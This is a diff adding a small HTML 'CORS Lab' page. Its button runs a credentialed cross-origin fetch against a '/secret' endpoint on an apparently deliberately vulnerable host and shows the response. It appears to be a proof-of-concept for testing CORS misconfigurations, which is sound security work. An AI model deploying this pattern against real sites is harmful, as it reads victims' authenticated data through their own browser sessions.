@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head><title>CORS Lab</title></head>
+<body>
+  <h2>CORS Lab</h2>
+  <button onclick="fetchData()">Fetch Sensitive Data</button>
+  <pre id="output"></pre>
+
+  <script>
+    function fetchData() {
+      fetch("https://vulnerable-api.bugbountypoc.in/secret", {
+        method: "GET",
+        credentials: "include"
+      })
+      .then(response => response.text())
+      .then(data => {
+        document.getElementById("output").innerText = data;
+      });
+    }
+  </script>
+</body>
+</html>
